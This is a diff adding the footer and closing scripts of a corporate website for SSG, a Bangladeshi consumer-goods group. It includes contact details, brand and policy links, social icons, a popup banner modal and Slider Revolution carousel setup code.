+        <div class="container text-center text-md-left">
+          <!-- Footer links -->
+          <div class="row text-center text-md-left mt-3 pb-3">
+            <!-- Grid column -->
+            <div class="col-md-2 col-lg-2 col-xl-2 mx-auto">
+              <img class="img-fluid" src="themes/ssg/assets/images/ssg-logo-white.png" alt="" /><br>
+              
+              <p class="mt-4">
+                  <i class="fas fa-home mr-3"></i> SSG Center <br>                  
+                    Nabosrista Plot # 1/A
+                    Tejgaon I/A, Dhaka -1208. 
+              </p>
+              <p><i class="fas fa-envelope mr-3"></i> info@ssgbd.com</p>
+              <p><i class="fas fa-phone mr-3"></i> <a href="tel:+8809610774774"> +88-09610-774774</a></p>
+            </div>
+            <!-- Grid column -->
+
+            <hr class="w-100 clearfix d-md-none" />
+
+            <!-- Grid column -->
+            <div class="col-md-2 col-lg-2 col-xl-2 mx-auto mt-3">
+              <h6 class="text-uppercase mb-4 font-weight-bold">About Us</h6>
+              <p>
+                <a  href="about-us">Company Overview</a>
+              </p>
+              <p>
+                <a href="our-management">Our Management</a>
+              </p>
+              
+              </div>
+                                        <!-- Grid column -->
+
+              <hr class="w-100 clearfix d-md-none" />
+
+                                        <!-- Grid column -->
+                                        <div class="col-md-2 col-lg-2 col-xl-2 mx-auto mt-3">
+                                            <h6 class="text-uppercase mb-4 font-weight-bold">Brands</h6>
+                                            <p>
+                                                <a href="super-star">Super Star</a>
+                                            </p>
+                                            <p>
+                                                <a href="roots">Roots</a>
+                                            </p>
+                                            <p>
+                                                <a href="orlee">Orlee</a>
+                                            </p>
+                                            <p>
+                                                <a href="blink">Blink</a>
+                                            </p>
+                                            <p>
+                                                <a href="super-star-tissue">Super Star Tissue</a>
+                                            </p>
+                                        </div>
+
+                                        <!-- Grid column -->
+                                        <hr class="w-100 clearfix d-md-none" />
+
+                                        <!-- Grid column -->
+                                        <div class="col-md-2 col-lg-2 col-xl-2 mx-auto mt-3">
+                                            <h6 class="text-uppercase mb-4 font-weight-bold">MEDIA CORNER</h6>
+                                            <p>
+                                                <a href="awards-achievements">Awards & Achievements</a>
+                                            </p>
+                                            <p>
+                                                <a href="media-center">Media Center </a>
+                                            </p>
+                                            <p>
+                                                <a href="news-events">News & Events</a>
+                                            </p>
+                                            
+                                        </div>
+                                        <!-- Grid column -->
+                                        <!-- Grid column -->
+                                        <hr class="w-100 clearfix d-md-none" />
+
+                                        <!-- Grid column -->
+                                        <div class="col-md-2 col-lg-2 col-xl-2 mx-auto mt-3">
+                                            <h6 class="text-uppercase mb-4 font-weight-bold">Information</h6>
+                                            <p>
+                                                <a href="career">Career</a>
+                                            </p>
+                                            <p>
+                                                <a href="https://www.ssgbd.com/webmail">Webmail</a>
+                                            </p>
+                                            <p>
+                                                <a href="super-star-holdings">Terms & Conditions</a>
+                                            </p>
+                                            <p>
+                                                <a href="privacy-policy">Privacy Policy</a>
+                                            </p>
+                                            <p>
+                                                <a href="super-star-holdings">Sitemap</a>
+                                            </p>
+                                            <p>
+                                                <a href="contact">Contact Us</a>
+                                            </p>
+                                        </div>
+                                        <!-- Grid column -->
+                                        <!-- Grid column -->
+                                        <hr class="w-100 clearfix d-md-none" />
+
+                                        <!-- Grid column -->
+                                        <div class="col-md-2 col-lg-2 col-xl-2 mx-auto mt-3">
+                                            <h6 class="text-uppercase mb-4 font-weight-bold">Other Links</h6>
+                                            <p>
+                                                <a target="_new" href="https://ssgeshop.com/">SSG eShop</a>
+                                            </p>
+                                            <p>
+                                                <a href="super-star-holdings">Become an Affiliate</a>
+                                            </p>
+                                           
+                                        </div>
+                                        <!-- Grid column -->
+                                </div>
+                                <!-- Footer links -->
+
+                                <hr />
+
+                                <!-- Grid row -->
+                                <div class="row d-flex align-items-center">
+                                    <!-- Grid column -->
+                                    <div class="col-md-7 col-lg-8">
+                                        <!--Copyright-->
+                                        <p class="text-center text-md-left">
+                                            © 2025 Copyright:
+                                            <a href="super-star-holdings#">
+                                                <strong> ssgbd.com</strong>
+                                            </a>
+                                        </p>
+                                    </div>
+                                    <!-- Grid column -->
+
+                                    <!-- Grid column -->
+                                    <div class="col-md-5 col-lg-4 ml-lg-0">
+                                        <!-- Social buttons -->
+                                        <div class="text-center text-md-right">
+                                        <span id="social-icons">
+                                          <a target="_new" class="facebook" href="https://www.facebook.com/pg/ssgbd"
+                                            ><img src="themes/ssg/assets/images/icons/fb.png" alt=""
+                                          /></a>
+                                          <a  target="_new" class="youtube" href="https://www.youtube.com/channel/UCvQ2qwNbP4EZmuXDlqZwdDA">
+                                          <img src="storage/app/media/icons/youtube-icon.png" alt=""/></a>
+                        
+                                          <a target="_new" class="instagram" href="https://www.instagram.com/ssg.bd/"><img src="storage/app/media/icons/instagram-icon.png" alt=""/></a>
+                                          <a target="_new" class="linkedin" href="https://www.linkedin.com/company/super-star-group/"
+                                            ><img src="themes/ssg/assets/images/icons/linkedin.png" alt=""
+                                          /></a>
+                                        </span>
+                                            
+                                        </div>
+                                    </div>
+                                    <!-- Grid column -->
+                                </div>
+                                <!-- Grid row -->
+                            </div>
+                            <!-- Footer Links -->
+                            <!-- <button id="quiz-btn" data-fancybox data-animation-duration="700" data-src="#quiz" href="javascript:;">Quiz</button>
+                            <div style="display: none;" id="quiz">
+                            
+                                                       <iframe src="https://docs.google.com/forms/d/e/1FAIpQLSeOLJ7Kbc6y4mTQPi04C-vD7rhwV3tyEjtGPEmXUx_p2Cy1RA/viewform?embedded=true" width="450" height="2252" frameborder="0" marginheight="0" marginwidth="0">Loading…</iframe>
+                                                    </div> -->        </footer>
+    </div>
+    <img id="popMakerMyImg" src="storage/app/media/Pop-Up-Banner-Design.jpg" alt="Snow" style="width:100%;max-width:300px; display: none;">
+
+    <!-- The Modal -->
+    <div id="myModal" class="popupModal">
+      <span class="close">&times;</span>
+      <img class="popupModal-content" id="img01"> 
+    </div>
+    <!--
+     jQuery first, then Popper.js, then Bootstrap JS
+    -->
+
+    
+   <!-- lightbox-->
+    <script type="text/javascript" src="themes/ssg/assets/slider-assets/js/jquery.themepunch.tools.min.js"></script>
+    
+    
+    <!-- cdnjs -->
+    <script>
+      AOS.init({
+          duration: 1000
+          
+    });
+    </script>
+    
+    
+        <!-- REVOLUTION JS FILES -->
+    <script type="text/javascript" src="themes/ssg/assets/slider-assets/js/jquery.themepunch.tools.min.js"></script>
+    <script type="text/javascript" src="themes/ssg/assets/slider-assets/js/jquery.themepunch.revolution.min.js"></script>
+
+    <!-- SLIDER REVOLUTION 5.0 EXTENSIONS  (Load Extensions only on Local File Systems !  The following part can be removed on Server for On Demand Loading) -->
+    <script type="text/javascript" src="themes/ssg/assets/slider-assets/js/extensions/revolution.extension.actions.min.js"></script>
+    <script type="text/javascript" src="themes/ssg/assets/slider-assets/js/extensions/revolution.extension.carousel.min.js"></script>
+    <script type="text/javascript" src="themes/ssg/assets/slider-assets/js/extensions/revolution.extension.kenburn.min.js"></script>
+    <script type="text/javascript" src="themes/ssg/assets/slider-assets/js/extensions/revolution.extension.layeranimation.min.js"></script>
+    <script type="text/javascript" src="themes/ssg/assets/slider-assets/js/extensions/revolution.extension.migration.min.js"></script>
+    <script type="text/javascript" src="themes/ssg/assets/slider-assets/js/extensions/revolution.extension.navigation.min.js"></script>
+    <script type="text/javascript" src="themes/ssg/assets/slider-assets/js/extensions/revolution.extension.parallax.min.js"></script>
+    <script type="text/javascript" src="themes/ssg/assets/slider-assets/js/extensions/revolution.extension.slideanims.min.js"></script>
+    <script type="text/javascript" src="themes/ssg/assets/slider-assets/js/extensions/revolution.extension.video.min.js"></script>
+
+    <script src="themes/ssg/assets/javascript/main.js"></script>
+    <script type="text/javascript">
+        function setREVStartSize(e) {
+            try {
+                e.c = jQuery(e.c);
+                var i = jQuery(window).width(),
+                    t = 9999,
+                    r = 0,
+                    n = 0,
+                    l = 0,
+                    f = 0,
+                    s = 0,
+                    h = 0;
+                if (e.responsiveLevels && (jQuery.each(e.responsiveLevels, function(e, f) {
+                        f > i && (t = r = f, l = e), i > f && f > r && (r = f, n = e)
+                    }), t > r && (l = n)), f = e.gridheight[l] || e.gridheight[0] || e.gridheight, s = e.gridwidth[l] || e.gridwidth[0] || e.gridwidth, h = i / s, h = h > 1 ? 1 : h, f = Math.round(h * f), "fullscreen" == e.sliderLayout) {
+                    var u = (e.c.width(), jQuery(window).height());
+                    if (void 0 != e.fullScreenOffsetContainer) {
+                        var c = e.fullScreenOffsetContainer.split(",");
+                        if (c) jQuery.each(c, function(e, i) {
+                            u = jQuery(i).length > 0 ? u - jQuery(i).outerHeight(!0) : u
+                        }), e.fullScreenOffset.split("%").length > 1 && void 0 != e.fullScreenOffset && e.fullScreenOffset.length > 0 ? u -= jQuery(window).height() * parseInt(e.fullScreenOffset, 0) / 100 : void 0 != e.fullScreenOffset && e.fullScreenOffset.length > 0 && (u -= parseInt(e.fullScreenOffset, 0))
+                    }
+                    f = u
+                } else void 0 != e.minHeight && f < e.minHeight && (f = e.minHeight);
+                e.c.closest(".rev_slider_wrapper").css({
+                    height: f
+                })
+            } catch (d) {
+                console.log("Failure at Presize of Slider:" + d)
+            }
+        };
+    </script>
+     <script type="text/javascript">
+        var revapi1,
+            tpj;
+        (function() {
+            if (!/loaded|interactive|complete/.test(document.readyState)) document.addEventListener("DOMContentLoaded", onLoad);
+            else onLoad();
+
+            function onLoad() {
+                if (tpj === undefined) {
+                    tpj = jQuery;
+                    if ("off" == "on") tpj.noConflict();
+                }
+                if (tpj("#rev_slider_1_1").revolution == undefined) {
+                    revslider_showDoubleJqueryError("#rev_slider_1_1");
+                } else {
+                    revapi1 = tpj("#rev_slider_1_1").show().revolution({
+                        sliderType: "standard",
+                        jsFileLocation: "//truthenlightened.com/truthenlightened/wp-content/plugins/revslider/public/assets/js/",
+                        sliderLayout: "auto",
+                        dottedOverlay: "none",
+                        delay: 9000,
+                        navigation: {
+                            keyboardNavigation: "off",
+                            keyboard_direction: "horizontal",
+                            mouseScrollNavigation: "off",
+                            mouseScrollReverse: "default",
+                            onHoverStop: "off",
+                            arrows: {
+                                style: "uranus",
+                                enable: true,
+                                hide_onmobile: false,
+                                hide_onleave: false,
+                                tmp: '',
+                                left: {
+                                    h_align: "left",
+                                    v_align: "center",
+                                    h_offset: 20,
+                                    v_offset: 0
+                                },
+                                right: {
+                                    h_align: "right",
+                                    v_align: "center",
+                                    h_offset: 20,
+                                    v_offset: 0
+                                }
+                            }
+                        },
+                        visibilityLevels: [1240, 1024, 778, 480],
+                        gridwidth: 1900,
+                        gridheight: 720,
+                        lazyType: "none",
+                        shadow: 0,
+                        spinner: "off",
+                        stopLoop: "off",
+                        stopAfterLoops: -1,
+                        stopAtSlide: -1,
+                        shuffle: "off",
+                        autoHeight: "off",
+                        disableProgressBar: "on",
+                        hideThumbsOnMobile: "off",
+                        hideSliderAtLimit: 0,
+                        hideCaptionAtLimit: 0,
+                        hideAllCaptionAtLilmit: 0,
+                        debugMode: false,
+                        fallbacks: {
+                            simplifyAll: "off",
+                            nextSlideOnWindowFocus: "off",
+                            disableFocusListener: false,
+                        }
+                    });
+                }; /* END OF revapi call */
+
+            }; /* END OF ON LOAD FUNCTION */
+        }()); /* END OF WRAPPING FUNCTION */
+    </script>
+    <script>
+        window.onscroll = function() {myFunction()};
+        var navbar = document.getElementById("header");
+        var sticky = navbar.offsetTop;
+        
+        function myFunction() {
+          if (window.pageYOffset >= sticky) {
+            navbar.classList.add("sticky")
+          } else {
+            navbar.classList.remove("sticky");
+          }
+        }
+    </script>
+     <script>
+        $(".carousel").swipe({
+        
+          swipe: function(event, direction, distance, duration, fingerCount, fingerData) {
+        
+            if (direction == 'left') $(this).carousel('next');
+            if (direction == 'right') $(this).carousel('prev');
+        
+          },
+          allowPageScroll:"vertical"
+        
+        });
+
+        $('.slide-item').addClass('img-fluid');
+    </script>
+    
+    
+    <script>
+    // Get the modal
+    console.log('ddddddddddd');
+    var modal = document.getElementById("myModal");
+     
+    var img = document.getElementById("popMakerMyImg");
+    var modalImg = document.getElementById("img01"); 
+    
+    // Automatically open the modal and set the image source
+    window.onload = function() {
+        console.log('window-onload');
+      modal.style.display = "block";
+      modalImg.src = img.src;
+    }
+    
+    // Get the <span> element that closes the modal
+    var span = document.getElementsByClassName("close")[0];
+    
+    // When the user clicks on <span> (x), close the modal
+    span.onclick = function() { 
+      modal.style.display = "none";
+    }
+    </script>
+
+   
+        <script src="modules/system/assets/js/framework.combined-min.js"></script>
+<link rel="stylesheet" property="stylesheet" href="modules/system/assets/css/framework.extras-min.css">
+            
+
+</body>
+
+</html>
